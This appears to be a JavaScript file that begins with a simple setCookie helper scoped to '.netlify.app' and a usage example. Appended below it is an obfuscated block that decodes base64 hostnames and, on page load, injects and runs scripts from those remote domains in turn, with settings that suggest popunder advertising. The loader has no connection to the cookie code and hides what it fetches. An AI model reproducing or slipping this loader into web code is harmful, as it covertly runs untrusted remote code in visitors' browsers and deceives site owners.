// Set a cookie for the specific website
function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + value + expires + "; path=/; domain=.netlify.app";
}

// Usage example
setCookie("exampleCookie", "Hello, this is a cookie!", 7);



/*<![CDATA[/* */
(function(){var v=window,l="e74ea0fcf47aacc1ba839c7012afddb0",i=[["siteId",562*808*586-261031097],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer",!0]],a=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9jZ3JlbWxpbnMubWluLmNzcw==","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvY29tbW9uL3JvbmZpcmUubWluLmpz","d3d3LnVvc3lpb3p5dS5jb20vZ2dyZW1saW5zLm1pbi5jc3M=","d3d3Lm14cG9ycXRpc3guY29tL2NvbW1vbi96b25maXJlLm1pbi5qcw=="],m=-1,o,d,p=function(){clearTimeout(d);m++;if(a[m]&&!(1733473213000<(new Date).getTime()&&1<m)){o=v.document.createElement("script");o.type="text/javascript";o.async=!0;var b=v.document.getElementsByTagName("script")[0];o.src="https://"+atob(a[m]);o.crossOrigin="anonymous";o.onerror=p;o.onload=function(){clearTimeout(d);v[l.slice(0,16)+l.slice(0,16)]||p()};d=setTimeout(p,5E3);b.parentNode.insertBefore(o,b)}};if(!v[l]){try{Object.freeze(v[l]=i)}catch(e){}p()}})();
/*]]>/* */

